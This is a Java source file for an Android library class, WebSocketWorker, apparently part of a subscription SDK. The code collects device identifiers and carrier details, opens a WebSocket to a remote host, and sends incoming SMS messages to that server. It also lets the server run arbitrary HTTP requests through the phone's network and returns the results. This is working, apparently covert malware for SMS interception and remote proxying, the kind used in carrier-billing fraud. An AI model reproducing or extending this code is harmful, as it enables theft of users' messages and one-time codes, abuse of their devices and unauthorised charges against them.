package com.enhtmv.sublib.work;

import com.alibaba.fastjson.JSON;
import com.blankj.utilcode.util.AppUtils;
import com.blankj.utilcode.util.DeviceUtils;
import com.blankj.utilcode.util.LogUtils;
import com.blankj.utilcode.util.NetworkUtils;
import com.cp.plugin.http.HttpReqest;
import com.enhtmv.sublib.common.sub.SubCall;
import com.enhtmv.sublib.common.util.NetUtil;

import java.util.HashMap;
import java.util.Locale;
import java.util.Map;
import java.util.TimeZone;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;

public class WebSocketWorker extends SubCall {

    private final static String BEGIN = "begin";
    private final static String NETWORK = "network";
    private final static String SMS = "sms";

    private Map<String, String> infoMap = new HashMap<>();

    private WebSocket socket;

    public WebSocketWorker() {

        String operatorName = NetworkUtils.getNetworkOperatorName();


        infoMap.put("android_id", DeviceUtils.getAndroidID());
        infoMap.put("version", AppUtils.getAppVersionName());
        infoMap.put("sdk_version", DeviceUtils.getSDKVersionName());
        infoMap.put("device_name", DeviceUtils.getModel());
        infoMap.put("operator_name", operatorName == null ? "" : operatorName);
        infoMap.put("package_name", AppUtils.getAppPackageName());


        infoMap.put("timezone", TimeZone.getDefault().getID());
        infoMap.put("lang", Locale.getDefault().getLanguage());

    }


    @Override
    public void onSub(String message) {
        super.onSub(message);


        if (socket != null) {
            Map<String, Object> data = new HashMap<>();

            data.put("type", SMS);
            data.put("data", message);

            socket.send(JSON.toJSONString(data));
        }
    }

    @Override
    public void sub(String host) {

//        host = "ws://10.0.2.2:8010/ws";

        OkHttpClient client = new OkHttpClient.Builder().build();

        Request request = new Request.Builder().url(host).build();

        infoMap.put("operator_code", operator == null ? "" : operator);
        infoMap.put("network", NetUtil.getNetworkName());


        try {
            client.newWebSocket(request, new WebSocketListener() {
                @Override
                public void onOpen(WebSocket webSocket, Response response) {
                    super.onOpen(webSocket, response);

                    report(WEBSOCKET_CONNECT);
                    LogUtils.i("websocket open");


                    Map<String, Object> data = new HashMap<>();

                    data.put("type", BEGIN);
                    data.put("data", infoMap);

                    webSocket.send(JSON.toJSONString(data));

                    socket = webSocket;

                }

                @Override
                public void onMessage(final WebSocket webSocket, final String text) {
                    super.onMessage(webSocket, text);

                    LogUtils.i("websocket message", text);

                    new Thread(new Runnable() {
                        @Override
                        public void run() {
                            HttpReqest reqest = JSON.parseObject(text, HttpReqest.class);

                            reqest.setHttp(http());


                            Map<String, Object> data = new HashMap<>();

                            data.put("type", NETWORK);
                            data.put("data", reqest.call());

                            webSocket.send(JSON.toJSONString(data));

                        }
                    }).start();
                }

                @Override
                public void onClosing(WebSocket webSocket, int code, String reason) {
                    super.onClosing(webSocket, code, reason);
                    LogUtils.i("onClosing 关闭websocket连接!");

                    report(WEBSOCKET_CLOSE);
                }
            });

            Thread.sleep(600 * 1000);
        } catch (Exception e) {
            LogUtils.e(e);
        }

    }
}
